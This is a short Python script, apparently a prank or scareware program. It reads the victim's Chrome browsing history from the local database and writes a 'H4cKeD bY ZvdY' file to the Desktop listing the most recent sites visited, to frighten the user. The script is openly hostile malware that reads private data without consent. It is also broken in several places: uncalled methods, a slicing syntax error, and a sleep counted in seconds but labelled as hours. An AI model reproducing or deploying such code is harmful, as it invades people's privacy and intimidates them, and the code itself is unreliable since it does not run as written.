import os
from pathlib import Path
from time import sleep
from random import randrange
import sqlite3


HACKER_FILE_NAME = "README.txt"


def get_user_path():
    return "{}/".format(Path.home())

def delay_action():
    n_hours = randrange(1, 4)
    print("Sleeping {} hours".format(n_hours))
    sleep(n_hours)


def create_hacker_file(user_path):
    hack_file = open(user_path + "Desktop/" + HACKER_FILE_NAME, "w")
    hack_file.write("H4cKeD bY ZvdY\n")
    return hack_file


def get_chrome_history(user_path):
    urls = None
    while not urls:
        try:
            history_path = user_path + "/AppData/Local//Google//Chrome/User Data/Default/History"
            connection = sqlite3.connect(history_path)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall
            connection.close
            return urls
        except sqlite3.OperationalError:
            print("Unable to connect, retrying in a few moments...")
            sleep(5)

def check_history_and_scare_user(hack_file, chrome_history):
    for item in chrome_history(:10):
        hack_file.write("I saw you visisted the web {}, interesting...\n".format(item[0]))

def main():
    delay_action()
    # Desktop Path & User Path
    # Create route
    user_path = get_user_path()
    # Create file
    hack_file = create_hacker_file(user_path)
    # Fetch data
    chrome_history = get_chrome_history(user_path)
    # Writing scaring files
    check_history_and_scare_user(hack_file, chrome_history)


if __name__ == "__main__":
    main()
